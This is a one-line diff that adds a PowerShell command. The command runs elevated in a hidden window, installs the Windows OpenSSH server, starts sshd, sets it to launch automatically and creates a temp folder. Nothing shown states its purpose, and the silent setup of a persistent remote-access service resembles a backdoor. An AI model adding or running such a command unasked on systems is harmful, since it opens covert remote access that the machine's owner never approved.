@@ -1,0 +1,1 @@
+Start-Process powershell -windowstyle hidden -verb RunAs -ArgumentList "Add-WindowsCapability -Online -name  OpenSSH.server~~~~0.0.1.0; dism /online /add-capability /capabilityName:OpenSSH.server~~~~0.0.1.0; Install-Module -force OpenSSHUtils; Start-Service sshd; Set-Service sshd -StartupType Automatic; mkdir $env:temp\test; exit"
